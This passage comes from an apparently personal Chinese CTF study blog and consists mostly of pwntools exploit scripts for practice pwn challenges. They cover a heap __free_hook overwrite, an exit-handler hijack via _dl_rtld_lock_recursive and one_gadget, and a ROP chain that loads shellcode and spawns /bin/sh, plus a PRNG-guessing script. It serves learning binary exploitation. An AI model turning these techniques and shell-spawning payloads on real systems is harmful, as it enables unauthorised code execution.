libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base &#x3D; u64(sh.recvuntil(</span><br><span class="line">        &#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;)) - 0x07b61e</span><br><span class="line">    success(&#39;libc_base &#x3D; &#39;+hex(libc_base))</span><br><span class="line">    __malloc_hook&#x3D;libc_base+libc.sym[&#39;__malloc_hook&#39;]</span><br><span class="line">    __free_hook&#x3D;libc_base+libc.sym[&#39;__free_hook&#39;]</span><br><span class="line">    system&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">def cmd(index):</span><br><span class="line">    sla(&#39;&#x2F;$ &#39;,str(index))</span><br><span class="line">def add(size,name,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla(&#39;name size: &#39;,str(size))</span><br><span class="line">    sa(&#39;note name: &#39;,name)</span><br><span class="line">    sa(&#39;content: &#39;,content)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sla(&#39; note id: &#39;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(4)</span><br><span class="line">    sla(&#39;note id: &#39;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla(&#39;note id: &#39;,str(index))</span><br><span class="line">    sa(&#39;content: &#39;,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x10,&#39;a\n&#39;,&#39;b&#39;*0x18)#0</span><br><span class="line">add(0x10,&#39;a\n&#39;,&#39;&#x2F;bin&#x2F;sh\x00\n&#39;)#1</span><br><span class="line">show(0)</span><br><span class="line">leaklibc()</span><br><span class="line"></span><br><span class="line">add(0x10,&#39;a\n&#39;,&#39;b\n&#39;)#2</span><br><span class="line">edit(2,&#39;b&#39;*0x10+p64(0)+&#39;\xff&#39;*8)</span><br><span class="line"># top chunk上移形成overlap chunk</span><br><span class="line">add(-0x80, p64(__free_hook), &#39;&#39;)  # 3</span><br><span class="line"># 修改free_hook</span><br><span class="line">edit(2, p64(system))</span><br><span class="line"># getshell</span><br><span class="line">dele(1)</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p><strong>hf2020 marksman</strong></p><p>可以任意地址写3字节，</p><p>程序最后会调用exit</p><blockquote><p>在exit()中执行流程为</p><p>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</p><p>由于__rtld_lock_unlock_recursive存放在结构体空间，为可读可写，那么如果可以修改__rtld_lock_unlock_recursive,就可以在调用exit()时劫持程序流。</p><p>_rtld_lock_lock_recursive也是一样的流程。</p><p>————————————————</p><p>版权声明：本文为CSDN博主「starssgo」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</p><p>原文链接：<a href="https://blog.csdn.net/qq_43116977/article/details/105485947">https://blog.csdn.net/qq_43116977/article/details/105485947</a></p></blockquote><p>总之中间调来调去最后会调用 _rtld_global结构 体成员 _dl_rtld_lock_recursive 指针</p><p>改写它内容后3位为og即可</p><p>（_dl_rtld_lock_recursive指向的内容距离 libc_base有点远，修改后三字节要多试几次才能成功emmm ）</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618488882443-55d39820-d87c-456a-a930-0bf1ca9724f7.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618489162188-e1230e99-83b1-4631-a682-3fae3f4870ad.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618489550470-d97a4b64-5915-4b98-9393-1b815a69da01.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"># context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">binary &#x3D; &#39;.&#x2F;chall&#39;</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">libc &#x3D; ELF(</span><br><span class="line">    &quot;&#x2F;home&#x2F;ive6ix&#x2F;Desktop&#x2F;glibc-all-in-one-master&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc.so.6&quot;)</span><br><span class="line">flag&#x3D;1</span><br><span class="line">if flag:</span><br><span class="line">    sh &#x3D; remote(&#39;node3.buuoj.cn&#39;, 29718)</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(binary)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;: 0x&#39;)</span><br><span class="line">libc_base &#x3D; int(sh.recvuntil(&#39;\n&#39;, drop&#x3D;True), 16) - libc.sym[&#39;puts&#39;]</span><br><span class="line">leak(&#39;libc_base&#39;,libc_base)</span><br><span class="line"></span><br><span class="line">_dl_rtld_lock_recursive &#x3D; libc_base+0x81df60</span><br><span class="line">sla(&#39;shoot!shoot!&#39;, str(_dl_rtld_lock_recursive))</span><br><span class="line"></span><br><span class="line">og &#x3D; libc_base+0x10a38c-5</span><br><span class="line">sla(&#39;biang!&#39;,chr(og&amp;0xff))</span><br><span class="line">sla(&#39;biang!&#39;,chr((og&amp;0xff00)&gt;&gt;8))</span><br><span class="line"># pause()</span><br><span class="line">sla(&#39;biang!&#39;,chr((og&amp;0xff0000)&gt;&gt;16))</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p>这种修改 _dl_fini函数指针，是glibc2.27加了 对vtable的检查之后，一个新的绕过方法</p><p>之前在gibc2.23的时候是 <a href="https://www.jianshu.com/p/f54f48ce2695">修改stdout函数表</a></p><h3 id="4-16"><a href="#4-16" class="headerlink" title="4.16"></a>4.16</h3><h3 id="4-17"><a href="#4-17" class="headerlink" title="4.17"></a>4.17</h3><p>接上面，再练一道类似的题</p><p>给了libc和栈地址，任意地址写</p><p>可以改写栈上的返回地址为og，但是ret前exit了</p><p>所以还是得从exit下手，2.27的版本改__rtld_lock_unlock_recursive+0x8为og</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"># context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">binary&#x3D;&#39;.&#x2F;write&#39;</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">libc &#x3D; ELF(</span><br><span class="line">    &quot;&#x2F;home&#x2F;ive6ix&#x2F;Desktop&#x2F;glibc-all-in-one-master&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc.so.6&quot;)</span><br><span class="line">flag&#x3D;0</span><br><span class="line">if flag:</span><br><span class="line">    sh &#x3D; remote(&#39;&#39;, )</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(binary)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;puts: 0x&#39;)</span><br><span class="line">libc_base &#x3D; int(sh.recvuntil(&#39;\n&#39;,drop&#x3D;True),16) - libc.sym[&#39;puts&#39;]</span><br><span class="line">leak(&#39;libc_base&#39;,libc_base)</span><br><span class="line">sh.recvuntil(&#39;stack: 0x&#39;)</span><br><span class="line">stack_addr &#x3D; int(sh.recvuntil(&#39;\n&#39;, drop&#x3D;True), 16)</span><br><span class="line">leak(&#39;stack_addr&#39;, stack_addr)</span><br><span class="line"></span><br><span class="line">_dl_rtld_lock_recursive &#x3D; 0x619f68 + libc_base</span><br><span class="line">og &#x3D; [0x45226, 0x4527a, 0xf0364, 0xf1207]</span><br><span class="line">sla(&#39;uit&#39;,&#39;w&#39;)</span><br><span class="line"># pause()</span><br><span class="line">sla(&#39;ptr: &#39;,str(_dl_rtld_lock_recursive))</span><br><span class="line"># pause()</span><br><span class="line">sla(&#39;val: &#39;, str(0x4f322+libc_base))</span><br><span class="line"># pause()</span><br><span class="line">sla(&#39;uit&#39;, &#39;q&#39;)</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p>啊学不动pwn了。。。</p><p>注册个新号去学逆向好了。。。</p><h3 id="4-18"><a href="#4-18" class="headerlink" title="4.18"></a>4.18</h3><p>上海交大——操作系统课程</p><p>4.19</p><p>4.20</p><h3 id="4-21"><a href="#4-21" class="headerlink" title="4.21"></a>4.21</h3><p><a href="https://blog.csdn.net/weixin_39864373/article/details/111512547">pwn题的搭建</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/09/hitctfpwn/">复现hitCTF2020</a></p><p>向bss写入shellcode再跳转就好了</p><p>还有一种方法 反弹shell 还没看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">binary &#x3D; &#39;.&#x2F;dagongren1&#39;</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">libc&#x3D;ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">flag&#x3D;1</span><br><span class="line">if flag:</span><br><span class="line">    sh &#x3D; remote(&#39;127.0.0.1&#39;, 9997)</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(binary)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x0000000000400813</span><br><span class="line">format &#x3D; 0x000000000040088B # %s</span><br><span class="line">pop_rsi_r15 &#x3D; 0x0000000000400811</span><br><span class="line"># scanf(&quot;%s&quot;,&amp;buf)</span><br><span class="line">pay&#x3D;&#39;a&#39;*0x28</span><br><span class="line">pay +&#x3D; p64(pop_rdi)</span><br><span class="line">pay +&#x3D; p64(format)</span><br><span class="line">pay +&#x3D; p64(pop_rsi_r15)</span><br><span class="line">pay +&#x3D; p64(elf.bss()+0x250)</span><br><span class="line">pay +&#x3D; p64(0)</span><br><span class="line">pay +&#x3D; p64(elf.plt[&#39;__isoc99_scanf&#39;])</span><br><span class="line">pay +&#x3D; p64(elf.bss()+0x250)</span><br><span class="line"># pause()</span><br><span class="line">sla(&#39;Come On&#39;,pay)</span><br><span class="line"># pause()</span><br><span class="line">sc &#x3D; &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span><br><span class="line"># sc&#x3D;asm(shellcraft.sh())</span><br><span class="line">sl(sc)</span><br><span class="line">sl(&#39;exec &#x2F;bin&#x2F;sh 1&gt;&amp;0&#39;)</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618993139811-95019e88-fa9a-479f-92a6-363d6e16c1dd.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from ctypes import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"># context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">binary&#x3D;&#39;.&#x2F;lucky&#39;</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line"># libc&#x3D;ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">libc &#x3D; cdll.LoadLibrary(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">flag&#x3D;0</span><br><span class="line">if flag:</span><br><span class="line">    sh &#x3D; remote(&#39;&#39;, )</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(binary)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">sla(&#39;lucky guy&#39;,&#39;wendy&#39;)</span><br><span class="line">libc.srand((libc.time(0) &#x2F; 0xA)+1)</span><br><span class="line"></span><br><span class="line"># sla(&#39;number:&#39;, str(libc.rand()))</span><br><span class="line">for i in range(100):</span><br><span class="line">    sla(&#39;number:&#39;,str(libc.rand()))</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;4-8&quot;&gt;&lt;a href=&quot;#4-8&quot; class=&quot;headerlink&quot; title=&quot;4.8&quot;&gt;&lt;/a&gt;4.8&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;通过一字节修改mp_.tcache_bins，改大，并且把存放在堆空间上的tcache struct内容(一般在top </summary>
      
    
    
    
    
    <category term="others" scheme="https://brooke-hub.github.io/tags/others/"/>
    
  </entry>
  
</feed>
